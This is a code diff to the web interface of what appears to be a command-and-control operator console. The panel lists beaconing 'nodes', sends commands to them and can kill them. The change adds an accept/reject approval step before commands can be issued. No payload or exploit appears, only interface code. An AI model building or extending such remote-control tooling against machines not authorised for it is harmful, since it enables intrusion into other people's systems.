@@ -852,6 +852,14 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
 .act-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 10px;font-family:var(--mono);font-size:9px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;transition:all .15s}
 .act-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
 .act-btn.kill:hover{border-color:var(--red);color:var(--red);background:var(--red-dim)}
+.act-btn.accept{border-color:rgba(0,232,122,.5);color:var(--accent)}
+.act-btn.accept:hover{background:rgba(0,232,122,.18)}
+.act-btn.reject{border-color:rgba(255,59,92,.5);color:var(--red)}
+.act-btn.reject:hover{background:rgba(255,59,92,.18)}
+#pending-bar{padding:10px 16px;background:rgba(245,200,66,.06);border-bottom:1px solid rgba(245,200,66,.25);display:none;align-items:center;gap:10px;flex-shrink:0}
+.pending-icon{color:var(--yellow);font-size:13px}
+.pending-msg{font-size:10px;letter-spacing:.1em;color:var(--yellow);text-transform:uppercase;flex:1}
+.pend-count{font-size:9px;color:var(--yellow);letter-spacing:.05em;background:rgba(245,200,66,.12);padding:1px 6px;border:1px solid rgba(245,200,66,.3)}
 #empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;color:var(--muted)}
 .empty-glyph{font-size:36px;opacity:.12;letter-spacing:.4em}
 .empty-msg{font-size:10px;letter-spacing:.22em;text-transform:uppercase;opacity:.5}
@@ -935,8 +943,9 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
   <div id="sidebar">
     <div class="pane-head">
       <span class="pane-label">Active Nodes</span>
-      <div style="display:flex;align-items:center;gap:8px">
+      <div style="display:flex;align-items:center;gap:6px">
         <span class="pane-count" id="node-count">0</span>
+        <span class="pend-count" id="pend-count" style="display:none" title="Pending approval">0 PENDING</span>
         <button class="icon-btn" onclick="refreshSessions()" title="Refresh">&#x21bb;</button>
       </div>
     </div>
@@ -952,10 +961,18 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
       <span class="sel-meta" id="sel-meta"></span>
       <div class="sel-actions">
         <span id="last-poll"></span>
+        <button id="btn-accept-hdr" class="act-btn accept" style="display:none" onclick="acceptSelected()">&#x2714; ACCEPT</button>
+        <button id="btn-reject-hdr" class="act-btn reject" style="display:none" onclick="rejectSelected()">&#x2715; REJECT</button>
         <button class="act-btn" onclick="clearResults()">CLEAR</button>
         <button class="act-btn" onclick="fetchResults()">REFRESH</button>
         <button class="act-btn kill" onclick="killSession()">KILL NODE</button>
       </div>
+    </div>
+    <div id="pending-bar">
+      <span class="pending-icon">&#x23F3;</span>
+      <span class="pending-msg">AWAITING OPERATOR APPROVAL — accept this node to enable command execution</span>
+      <button class="act-btn accept" onclick="acceptSelected()">&#x2714; ACCEPT</button>
+      <button class="act-btn reject" onclick="rejectSelected()">&#x2715; REJECT</button>
     </div>
     <div id="empty-state">
       <div class="empty-glyph">&#x25A1;</div>
@@ -1009,7 +1026,7 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
 (function(){
   const token = sessionStorage.getItem('ghost_token');
   if (!token) { location.href = '/'; return; }
-  let selectedSid = null, currentTab = 'output';
+  let selectedSid = null, currentTab = 'output', selectedStatus = null;
   let cmdHistory = [], cmdHistIdx = -1;
   let lastResultCount = 0, lastBeaconTs = null;
 
@@ -1058,6 +1075,10 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
     document.getElementById('hdr-count').textContent = sessions.length;
     document.getElementById('node-count').textContent = sessions.length;
     const pulse = document.getElementById('pulse'), stxt = document.getElementById('status-txt');
+    const pendingCount = sessions.filter(s=>(s.status||'pending')==='pending').length;
+    const pendEl = document.getElementById('pend-count');
+    if (pendingCount > 0) { pendEl.textContent = pendingCount+' PENDING'; pendEl.style.display=''; }
+    else { pendEl.style.display='none'; }
     if (sessions.length > 0) {
       pulse.className='pulse live'; stxt.textContent='LIVE'; stxt.className='status-txt live';
       const newest = sessions.slice().sort((a,b)=>new Date(b.last_beacon)-new Date(a.last_beacon))[0];
@@ -1096,11 +1117,20 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
     document.getElementById('hdr-sel').style.color='var(--accent)';
     document.getElementById('session-header').style.display='flex';
     document.getElementById('empty-state').style.display='none';
-    document.getElementById('cmd-bar').style.display='block';
     document.getElementById('output-pane').dataset.sid='';
     switchTab(currentTab);
     await Promise.all([refreshSessions(),fetchResults(),fetchRecon()]);
-    document.getElementById('cmd-input').focus();
+    // determine pending state from current session list
+    const r2 = await api('/sessions'); if (!r2) return;
+    const sessions = await r2.json();
+    const cur = sessions.find(s=>s.session===sid);
+    selectedStatus = cur ? (cur.status||'pending') : 'pending';
+    const isPending = selectedStatus === 'pending';
+    document.getElementById('pending-bar').style.display = isPending ? 'flex' : 'none';
+    document.getElementById('btn-accept-hdr').style.display = isPending ? '' : 'none';
+    document.getElementById('btn-reject-hdr').style.display = isPending ? '' : 'none';
+    document.getElementById('cmd-bar').style.display = isPending ? 'none' : 'block';
+    if (!isPending) document.getElementById('cmd-input').focus();
   }
   window.selectSession = selectSession;
 
@@ -1208,6 +1238,8 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
 
   async function sendCmd(preset) {
     if (!selectedSid) return toast('NO NODE SELECTED','err');
+    if (selectedStatus==='pending') return toast('ACCEPT NODE FIRST','warn');
+    if (selectedStatus==='rejected') return toast('NODE REJECTED','err');
     const input=document.getElementById('cmd-input');
     const cmd=preset||input.value.trim(); if (!cmd) return;
     if (!preset&&cmd){cmdHistory.unshift(cmd);if(cmdHistory.length>100)cmdHistory.pop();cmdHistIdx=-1;}
@@ -1248,13 +1280,31 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
     if (!r) return;
     if (r.ok) { toast('SESSION ACCEPTED'); } else { toast('ACCEPT FAILED: '+r.status,'err'); }
     fetchAudit(); refreshSessions();
+    if (sid===selectedSid) {
+      selectedStatus='active';
+      document.getElementById('pending-bar').style.display='none';
+      document.getElementById('btn-accept-hdr').style.display='none';
+      document.getElementById('btn-reject-hdr').style.display='none';
+      document.getElementById('cmd-bar').style.display='block';
+      document.getElementById('cmd-input').focus();
+    }
   }
   async function rejectSession(sid) {
     const r=await api('/sessions/'+encodeURIComponent(sid)+'/reject',{method:'POST'});
     if (!r) return;
     if (r.ok) { toast('SESSION REJECTED','warn'); } else { toast('REJECT FAILED: '+r.status,'err'); }
     fetchAudit(); refreshSessions();
+    if (sid===selectedSid) {
+      selectedStatus='rejected';
+      document.getElementById('btn-accept-hdr').style.display='none';
+      document.getElementById('btn-reject-hdr').style.display='none';
+      document.getElementById('pending-bar').style.display='none';
+    }
   }
+  function acceptSelected() { if (selectedSid) acceptSession(selectedSid); }
+  function rejectSelected() { if (selectedSid) rejectSession(selectedSid); }
+  window.acceptSelected = acceptSelected;
+  window.rejectSelected = rejectSelected;
   window.acceptSession = acceptSession;
   window.rejectSession = rejectSession;
 
